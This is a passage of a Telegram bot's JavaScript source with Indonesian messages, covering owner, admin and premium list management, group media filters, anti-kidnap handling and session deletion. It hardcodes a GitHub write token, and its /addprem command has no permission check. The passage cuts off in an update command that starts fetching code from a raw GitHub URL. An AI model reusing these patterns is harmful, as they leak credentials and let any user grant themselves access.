    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});

// ========== COMMAND /addowner (BUTTON CONFIRM) ==========
bot.command("addowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`\`\`\`JavaScript
const CONTOH = "reply pesan dengan /addowner atau /addowner id"
\`\`\`
`, { parse_mode: "Markdown" }
    );
  }

  if (ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`JavaScript
const NOTE = "User ${targetUserId} Sudah Menjadi Owner"
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply(
`
\`\`\`JavaScript
const NOTE = "Apakah Anda Yakin Ingin Menambahkan ${targetUserId} Sebagai Owner ?"
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Yes", callback_data: `confirm_addowner_${targetUserId}`, style: "success" },
            { text: "No", callback_data: `cancel_addowner`, style: "danger" }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_addowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Sudah Jadi Owner");
  }

  ownerUsers.push(targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`JavaScript
const NOTE = "User ${targetUserId} Sudah Di AddOwner"
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("All Confirmation Successfully");
});

bot.action("cancel_addowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`JavaScript
const NOTE = "Penambahan Akses Owner Dibatalkan"
\`\`\`
`,
  { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("Canceled All Confirmation");
});

bot.command("delowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`\`\`\`JavaScript
const CONTOH = "reply pesan dengan /delowner atau /delowner id"
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`\`\`\`JavaScript
const NOTE = "User ${targetUserId} Bukan Owner"
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply(
`\`\`\`JavaScript
const NOTE = "Apakah Kamu Yakin Ingin Menghapus ${targetUserId} Dari Daftar Owner ?"
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Yes", callback_data: `confirm_delowner_${targetUserId}`, style: "success" },
            { text: "No", callback_data: `cancel_delowner`, style: "danger" }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_delowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Bukan Owner");
  }

  ownerUsers = ownerUsers.filter(id => id !== targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`\`\`\`JavaScript
const NOTE = "User ${targetUserId} Berhasil Dihapus Dari Owner"
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("Akses Owner Berhasil Dicabut");
});

bot.action("cancel_delowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`JavaScript
const NOTE = "Penghapusan Owner Dibatalkan"
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("Canceled");
});

bot.command("addadmin", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI ADDADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/addadmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/addadmin` sambil reply\n" +
      "👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  if (adminList.includes(targetUserId)) {
    return ctx.reply(
      `👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ⚠️ *SUDAH ADMIN* ⚠️\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 Sudah memiliki akses admin.\n` +
      `👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  addAdmin(targetUserId);

  await ctx.reply(
    `🎉 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DITAMBAHKAN* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🎉 Selamat! User sekarang memiliki\n` +
    `┇    akses penuh sebagai admin!\n` +
    `┇\n` +
    `┇ 📌 Akses: *Semua command admin*\n` +
    `🎉 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User dapat menggunakan semua fitur admin sekarang!_`,
    { parse_mode: "Markdown" }
  );
});

bot.command("addprem", async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply("🪧 Format: /addprem <user_id> atau reply chat user");
  }

  if (premiumUsers.includes(targetUserId)) {
    return ctx.reply(`User ${targetUserId} sudah menjadi akses premium.`);
  }

  await ctx.reply(`Apakah target id sudah benar ? Jika benar pilih durasi premium untuk target ID: ${targetUserId}`, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "30 HARI", callback_data: `prem_30_${targetUserId}`, style: "danger" },
          { text: "90 HARI", callback_data: `prem_90_${targetUserId}`, style: "success" },
          { text: "120 HARI", callback_data: `prem_120_${targetUserId}`, style: "primary" }
        ],
        [
          { text: "❌ CANCEL ACTION", callback_data: "prem_cancel", style: "danger" }
        ]
      ]
    }
  });
});

bot.action(/prem_.+/, async (ctx) => {
  const data = ctx.match[0];

  if (data === "prem_cancel") {
    await ctx.deleteMessage().catch(() => {});
    return;
  }

  const [_, duration, userId] = data.split("_");

  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }

  await ctx.editMessageText(
    `✅ Akses premium berhasil di Aktifkan\nUser: ${userId}\nDurasi: ${duration} hari`
  ).catch(() => {});
});

bot.command("deladmin", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI DELADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/deladmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/deladmin` sambil reply\n" +
      "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  if (!adminList.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *BUKAN ADMIN* ❌\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 User ini tidak terdaftar sebagai admin.\n` +
      `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  removeAdmin(targetUserId);

  await ctx.reply(
    `🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🚫 User sudah tidak memiliki\n` +
    `┇    akses admin lagi.\n` +
    `┇\n` +
    `┇ 📌 Akses admin telah dicabut.\n` +
    `🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User sekarang menjadi user biasa._`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delprem", checkAdmin, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`JavaScript
💎 ┏━━━━━━━━━━━━━━━━━━━━━━┓
✨  CARA PAKAI COMMAND DELPREMIUM
━━━━━━━━━━━━━━━━━━━━━━━
📌 Contoh:
/delprem 1113570863

📌 Atau reply user:
/delprem (reply pesan)
💎 ┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  if (!premiumUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`JavaScript
⚠️ ┏━━━━━━━━━━━━━━━━━━┓
❌ USER BUKAN PREMIUM
━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`

User ini tidak terdaftar premium sebagai
akses premium !
⚠️ ┗━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  premiumUsers = premiumUsers.filter(id => id !== targetUserId);
  saveJSON(premiumFile, premiumUsers);

  await ctx.reply(
`
\`\`\`JavaScript
💎 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
✨  PREMIUM BERHASIL DIHAPUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`

🚫 Akses premium dicabut
📌 Sekarang user tidak memiliki akses
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
    { parse_mode: "Markdown" }
  );
});

bot.command("list", checkAdmin, async (ctx) => {
  await ctx.reply(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});

bot.action("show_premium", async (ctx) => {
  if (premiumUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙪𝙨𝙚𝙧 𝙥𝙧𝙚𝙢𝙞𝙪𝙢
\`\`\`
`,
      backBtn()
    );
  }

  let text = premiumUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡 𝙥𝙧𝙚𝙢𝙞𝙪𝙢: ${premiumUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== ADMIN ==========
bot.action("show_admin", async (ctx) => {
  if (adminList.length === 0) {
    return ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣
\`\`\`
`,
      backBtn()
    );
  }

  let text = adminList
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝘼𝘿𝙈𝙄𝙉 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡: ${adminList.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== OWNER ==========
bot.action("show_owner", async (ctx) => {
  if (ownerUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙊𝙒𝙉𝙀𝙍 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙤𝙬𝙣𝙚𝙧
\`\`\`
`,
      backBtn()
    );
  }

  let text = ownerUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙊𝙒𝙉𝙀𝙍 👑
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡: ${ownerUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== BACK ==========
bot.action("list_back", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON TEMPLATE ==========
function backBtn() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "◀️ BACK", callback_data: "list_back", style: "danger" }]
      ]
    }
  };
}

const startTime = Date.now();

bot.command("cekbot", async (ctx) => {
  try {
    const msg = await ctx.reply("🔄 initializing...");

    const steps = [
      "10% ⟩ checking panel...",
      "20% ⟩ loading cpu...",
      "30% ⟩ validating system...",
      "40% ⟩ checking connection...",
      "50% ⟩ syncing data...",
      "60% ⟩ scanning modules...",
      "70% ⟩ verifying security...",
      "80% ⟩ optimizing response...",
      "90% ⟩ finalizing...",
      "100% ⟩ completed ✔"
    ];

    for (let step of steps) {
      await new Promise(r => setTimeout(r, 350));

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        `🤖 <b>𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 SYSTEM CHECK</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }

    // uptime
    const uptime = Date.now() - startTime;

    const d = Math.floor(uptime / (1000 * 60 * 60 * 24));
    const h = Math.floor((uptime / (1000 * 60 * 60)) % 24);
    const m = Math.floor((uptime / (1000 * 60)) % 60);
    const s = Math.floor((uptime / 1000) % 60);

    const uptimeFormat = `${d}d ${h}h ${m}m ${s}s`;

    // ping
    const ping = Date.now() - (ctx.message.date * 1000);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>
🤖 <b>INFORMATION RUNNING</b>
━━━━━━━━━━━━━━━
┃ ⚡ Status : <b>ONLINE</b>
┃ ⏱️ Uptime : <code>${uptimeFormat}</code>
┃ 📡 Ping   : <code>${ping} ms</code>
┗━━━━━━━━━━━━━━━
</blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("TERJADI ERROR APDS COMMAND /cekbot:", err);
  }
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }
  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("delpair", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply(
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("⚠️ Contoh: /delpair 628xxxx");
  }

  const botNumber = args[1].replace(/[^0-9]/g, "");

  let statusMessage = await ctx.reply(
`\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 — 𝙇𝙊𝘼𝘿𝙄𝙉𝙂
ID: ${botNumber}
Status: Executing...\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);

    // 🔥 FIX UTAMA (ANTI BOT ZOMBIE)
    if (sock) {
      try {
        await sock.logout();
      } catch (e) {}

      try {
        sock.end?.();         // matiin koneksi
        sock.ws?.close?.();   // force close websocket
      } catch (e) {}

      sessions.delete(botNumber);
    }

    // 🔥 HAPUS FOLDER SESSION
    const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    // 🔥 UPDATE FILE SESSION
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const updatedNumbers = activeNumbers.filter(
        (num) => num !== botNumber
      );
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
    }

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 — 𝙎𝙐𝘾𝘾𝙀𝙎𝙎
ID: ${botNumber}
Status: Berhasil di hapus!\`\`\`
`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 — 𝙀𝙍𝙍𝙊𝙍
ID: ${botNumber}
Status: ${error.message}\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("restart", async (ctx) => {
  try {
    const teks = `
\`\`\`JavaScript
𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 - 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙇𝙔
━━━━━━━━━━━━━━━━━━━
⎌ 𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙍𝙚𝙨𝙩𝙖𝙧𝙩 𝙊𝙩𝙤𝙢𝙖𝙩𝙞𝙨 𝙋𝙖𝙙𝙖 𝙋𝙖𝙣𝙚𝙡 𝘽𝙖𝙣𝙜... 𝙈𝙤𝙝𝙤𝙣 𝙏𝙪𝙣𝙜𝙜𝙪 𝙎𝙚𝙟𝙚𝙣𝙖𝙠.....
\`\`\`
    `;

    await ctx.reply(teks, { parse_mode: "Markdown" });

    setTimeout(() => {
      process.exit(0);
    }, 2500);

  } catch (err) {
    console.log(err);
    ctx.reply("Gagal restart. Masalah pada Internal Server.");
  }
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});

bot.command('setcd', async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");

  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");

  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  COOLDOWN_TIME = time;
  COOLDOWN_TEXT = args[1];

  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
});

bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});


bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Sudah SAFE");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID : ${groupId}

👤 Pelaku:
• Nama : ${fullName}
• Username : ${username}
• ID : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}`, style: "success" },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}`, style: "danger" }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});

const GITHUB_TOKEN_WRITE = "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";

bot.command("update", async (ctx) => {
const repoRaw = "https://raw.githubusercontent.com/rahayudewilestari50-netizen/v7/main/index.js";

await ctx.reply("⏳ Sedang mengecek update...");

